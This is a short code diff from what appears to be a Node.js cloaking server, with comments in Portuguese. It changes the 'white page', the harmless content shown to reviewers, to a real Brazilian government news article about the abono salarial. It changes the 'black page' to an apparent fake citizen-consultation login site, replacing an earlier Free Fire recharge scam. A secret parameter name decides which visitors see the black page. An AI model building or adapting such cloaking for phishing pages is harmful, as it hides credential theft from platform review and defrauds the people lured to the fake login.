@@ -6,9 +6,9 @@ const port = process.env.PORT || 3000;
 // Configurações das páginas
 const whitePage =
   process.env.WHITE_PAGE ||
-  "https://ff.garena.com/pt/";
+  "https://www.gov.br/secom/pt-br/assuntos/noticias/2025/02/pagamento-do-abono-salarial-2025-comeca-na-segunda-17-valores-variam-entre-r-127-e-r-1.518";
 const blackPage =
-  process.env.BLACK_PAGE || "https://recargafreefire.fun/gaarena/";
+  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/login/";
 
 // Parâmetros de segurança
 const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
